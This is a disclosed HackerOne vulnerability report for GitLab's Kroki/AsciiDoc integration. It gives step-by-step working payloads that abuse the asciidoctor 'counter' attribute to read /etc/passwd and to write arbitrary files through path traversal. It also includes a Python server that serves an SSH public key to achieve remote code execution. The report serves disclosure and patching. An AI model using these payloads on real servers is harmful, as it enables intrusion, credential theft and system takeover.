# Kroki Arbitrary File Read/Write 

## Report Details
- **Report ID**: 1098793
- **URL**: https://hackerone.com/reports/1098793
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-02-08T22:24:33.101Z
- **Disclosed**: 2021-05-21T19:56:02.582Z

## Reporter
- **Username**: ledz1996
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

In short, I've found a potentially weird bug in `asciidoctor` that could lead to arbitrary file read/write in `asciidoctor-kroki` even though Gitlab have already made an attempt to disable `kroki-plantuml-include`

**lib/gitlab/asciidoc.rb**
```rb
module Gitlab
  # Parser/renderer for the AsciiDoc format that uses Asciidoctor and filters
  # the resulting HTML through HTML pipeline filters.
  module Asciidoc
    MAX_INCLUDE_DEPTH = 5
    MAX_INCLUDES = 32
    DEFAULT_ADOC_ATTRS = {
        'showtitle' => true,
        'sectanchors' => true,
        'idprefix' => 'user-content-',
        'idseparator' => '-',
        'env' => 'gitlab',
        'env-gitlab' => '',
        'source-highlighter' => 'gitlab-html-pipeline',
        'icons' => 'font',
        'outfilesuffix' => '.adoc',
        'max-include-depth' => MAX_INCLUDE_DEPTH,
        # This feature is disabled because it relies on File#read to read the file.
        # If we want to enable this feature we will need to provide a "GitLab compatible" implementation.
        # This attribute is typically used to share common config (skinparam...) across all PlantUML diagrams.
        # The value can be a path or a URL.
        'kroki-plantuml-include!' => '',
        # This feature is disabled because it relies on the local file system to save diagrams retrieved from the Kroki server.
        'kroki-fetch-diagram!' => ''
```

However this could easily be bypassed by using `counter`

https://github.com/asciidoctor/asciidoctor/blob/master/lib/asciidoctor/document.rb
```rb
  def counter name, seed = nil
    return @parent_document.counter name, seed if @parent_document
    if (attr_seed = !(attr_val = @attributes[name]).nil_or_empty?) && (@counters.key? name)
      @attributes[name] = @counters[name] = Helpers.nextval attr_val
    elsif seed
      @attributes[name] = @counters[name] = seed == seed.to_i.to_s ? seed.to_i : seed
    else
      @attributes[name] = @counters[name] = Helpers.nextval attr_seed ? attr_val : 0
    end
  end
```


### Steps to reproduce


1. Set up Gitlab with Kroki: https://docs.gitlab.com/ee/administration/integration/kroki.html
**Arbitrary FIle Read**
2. Create a project, create a wiki page with `asciidoctor` format and the following as payload

```asciidoctor
[#goals]

[plantuml, test="{counter:kroki-plantuml-include:/etc/passwd}", format="png"]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- {counter:kroki-plantuml-include}
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
....
```

3. Get the base64 part of the URL of the image when being rendered
4. Use the following code to decode the last part of the URL to get the content of file `/etc/passwd`

```rb
require 'base64'
require 'zlib'


test = "eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ=="
p Zlib::Inflate.inflate(Base64.urlsafe_decode64(test))
```

Video:

{F1188648}

**Arbitrary FIle Write**
1. Create a project, create a wiki page with `asciidoctor` format and the following as payload

```asciidoctor
[#goals]
:imagesdir: .
:outdir: /tmp/

[plantuml]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- hehe
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
....
```

2. Note in the URL there is a base64 value, copy this value

3. Set up a server with the address that is being appended as `kroki-server-url,`, I used this scriptto serve a public-key file with any URL.


```python
/// python3 this_script.py <port>
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        self._set_response()
        self.wfile.write(b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEY+UcYlP8VzOBdyMGUpbVFMsAUxPjWK7OiqARu/t3wO1mSNJ/RE5eaNLz5+6zM2WllUVrYF3cDXqNxge4srScM/v887Lz8mAupAZoPunxHrSTWFHjbCBaGm80z8QyStG+GMM/iN+mu4FtQ+ckMfOA8T/9k3clK3HomQXunJe85a6MPDsgE5MvEm4MdBUKQpEaEbstmAWtQIR5KCMHyNDa9WVKQQI+TJwAMpVa3L+Lbx4TZd04Fl5uKmCYUfPfBvj1/209s1XDN2rAK3AKJjAEbPVuLcZrl9iAse0FgA6HvUtA+g21VLba5OASXU/ZsedRmzECefMu8RVKHPzaaiC+RQU+1ihgBnQig0MdaXz8PZLOCo/673Pg9nsqjNafeU7fGTJD95BkkDL/3OfIEBq+rMbOyxrU+k8H+QWeVCbvh2LWRxdy/xciOMkkdodm2eGg45kJNjoDeKJEp0YpQ9ha+PdsqQqENAbqFqmYheAy1KJcpbG+U6Uik4hVXHxTAu0= ledz@ledzs-MacBook-Pro.local")

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                str(self.path), str(self.headers), post_data.decode('utf-8'))

        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
```

4. Note the URL and edit the following script to create a SHA256 of the URL

```rb
require 'digest'
require 'base64'
require 'zlib'

string = "http://192.168.69.1:8082/plantuml/../../../../../../tmp/test_file_write.txt/eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ=="

p "diag-#{Digest::SHA256.hexdigest test = string}"
```

4. Create a project, create a wiki page with `asciidoctor` format and the following as payload for the first time, replace the `diag-**.` with the `diag-<output_previous>.`, Please take note of the last `.`

```
[#goals]
:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.
:outdir: /tmp/

[plantuml, test="{counter:kroki-fetch-diagram:true}",tet="{counter:kroki-server-url:http://192.168.69.1:8082/}", format="/../../../../../../tmp/test_file_write.txt"]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- hehe
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
....
```

Save then render

5. Repeat the previous step with this payload

```
[#goals]
:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.
:outdir: /tmp/

[plantuml, test="{counter:kroki-fetch-diagram:true}",tet="{counter:kroki-server-url:http://192.168.69.1:8082/}", format="/../../../../../../tmp/test_file_write.txt"]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- hehe
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
```

Save then render again

5. You are able to write to any files. You can check this by simply navigate to the file using the Gitlab box

Video:

{F1188695}


#### Results of GitLab environment info

```
System information
System:     Ubuntu 16.04
Proxy:      no
Current User:   git
Using RVM:  no
Ruby Version:   2.7.2p137
Gem Version:    3.1.4
Bundler Version:2.1.4
Rake Version:   13.0.1
Redis Version:  5.0.9
Git Version:    2.29.0
Sidekiq Version:5.2.9
Go Version: unknown

GitLab information
Version:    13.7.4-ee
Revision:   368b4fb2eee
Directory:  /opt/gitlab/embedded/service/gitlab-rails
DB Adapter: PostgreSQL
DB Version: 11.9
URL:        http://gitlab3.example.vm
HTTP Clone URL: http://gitlab3.example.vm/some-group/some-project.git
SSH Clone URL:  git@gitlab3.example.vm:some-group/some-project.git
Elasticsearch:  no
Geo:        yes
Geo node:   Primary
Using LDAP: no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:    13.14.0
Repository storage paths:
- default:  /var/opt/gitlab/git-data/repositories
GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell
Git:        /opt/gitlab/embedded/bin/git
```

## Impact

File read/write access, RCE

## Attachments
- Screen_Recording_2021-02-09_at_04.27.43.mov
- Screen_Recording_2021-02-09_at_05.15.11.mov
